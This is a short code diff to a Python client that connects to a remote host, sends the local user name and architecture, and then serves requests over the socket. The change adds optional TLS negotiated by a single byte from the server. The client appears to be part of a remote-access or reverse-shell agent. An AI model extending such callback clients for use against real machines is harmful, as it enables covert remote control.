@@ -11,6 +11,7 @@ import threading
 import struct
 import base64
 import traceback
+import ssl
 try:
     from StringIO import StringIO
 except:
@@ -286,11 +287,13 @@ def main():
             try:
                 # Get and send info
                 user, arch = getInfo()
-
                 infodict = dict(user=user, arch=arch, version=__version__)
                 json_str = json.dumps(infodict)
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 s.connect((HOST, PORT))
+                sslbyte = s.recv(1)
+                if sslbyte != b'\x00':
+                    s = ssl.wrap_socket(s)
                 fs = FormatSocket(s)
                 fs.send(json_str)
                 serve(fs)
